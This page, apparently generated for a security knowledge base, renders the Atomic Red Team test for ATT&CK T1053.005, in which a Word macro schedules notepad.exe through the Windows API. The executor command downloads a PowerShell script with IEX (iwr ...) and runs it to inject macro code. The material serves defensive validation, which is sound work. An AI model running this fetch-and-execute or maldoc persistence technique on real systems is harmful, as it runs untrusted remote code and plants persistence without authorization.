---
atomic_guid: "ecd3fa21-7792-41a2-8726-2c5c673414d3"
title: "Task Scheduler via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1053.005"
attack_technique_name: "Scheduled Task/Job: Scheduled Task"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "ecd3fa21-7792-41a2-8726-2c5c673414d3"
  - "Task Scheduler via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Task Scheduler via VBA

This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
30 - 40 seconds after this module has run

## Metadata

- Atomic GUID: ecd3fa21-7792-41a2-8726-2c5c673414d3
- Technique: T1053.005: Scheduled Task/Job: Scheduled Task
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1053.005/T1053.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1053-scheduled_task_job|T1053.005]]

## Input Arguments

### ms_product

- description: Maldoc application Word
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
```

### Cleanup

```powershell
Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml)
